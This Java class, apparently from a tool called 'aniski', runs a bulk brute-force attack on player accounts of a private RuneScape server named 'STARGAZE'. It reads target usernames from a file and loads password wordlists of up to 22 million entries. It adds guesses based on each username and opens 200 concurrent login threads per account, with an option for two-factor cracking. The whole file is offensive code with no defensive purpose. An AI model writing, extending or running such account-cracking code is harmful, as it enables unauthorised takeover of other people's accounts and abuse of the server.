package aniski.flags.impl;

import aniski.flags.Flag;
import aniski.rs.LoginEncoder;
import aniski.rs.Store;
import aniski.rs.player.Player;
import aniski.rs.utils.TextEditor;
import aniski.rs.utils.ThreadFactory;

import java.util.ArrayList;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

public class CrackBulk implements Flag {

    private final Store store = new Store();
    private final LoginEncoder loginEncoder = new LoginEncoder();

    @Override
    public void init(Object[] args) {
        Store.setRspsToCrack("STARGAZE");
        createAttackThreadV2();
        //System.exit(0);
    }

    private void createAttackThreadV2() {
        ThreadFactory thread = new ThreadFactory();

        Executors.newSingleThreadScheduledExecutor(thread).schedule(() -> {
            TextEditor.getUsernameFromFile(getStore()); // Loads all the players that we are going to crack from the Players.txt file

            //getStore().generatePassword("lists/stoned/1K Quick Stone.txt");
            //getStore().generatePassword("lists/stoned/10K Quick Stone.txt");
            //getStore().generatePassword("lists/dictionary/10K Dictionary.txt");
            //getStore().generatePassword("lists/stoned/50K Quick Stone.txt");
            //getStore().generatePassword("lists/stoned/Gaming Unique 332k.txt");
            getStore().generatePassword("lists/stoned/800K Stoned.txt");
            //getStore().generatePassword("lists/first_names/ULTRA.txt");
            //getStore().generatePassword("lists/stoned/1.16M Stoned Gaming + RSPS.txt");
            //getStore().generatePassword("lists/stoned/22M/22M.txt");
            //getStore().generatePassword("lists/stoned/22M/22M - PART 2.txt");

            boolean twoFactorCrack = false;

            int startupDelay = 5;

            System.out.println("Initializing: Starting in "+startupDelay+" seconds...");

            for (String username : getStore().getStoredUsers()) {
                ArrayList<String> arrayList = new ArrayList<>(getStore().getStoredPasswords()); //IF YOU HAVE ANY ISSUES WITH CLONING - IT IS THIS!
                final Player player = new Player(username, arrayList);
                player.addNameRelatedPasswords(); //TODO Some issue with threads nulling
                player.checksPerSecond(startupDelay); // Creates checks per second thread
                getLoginEncoder().createLoginThreads(player, 200, this, twoFactorCrack, startupDelay);
            }
        }, 1, TimeUnit.SECONDS);

    }

    public LoginEncoder getLoginEncoder() {
        return loginEncoder;
    }

    public Store getStore() {
        return store;
    }

}
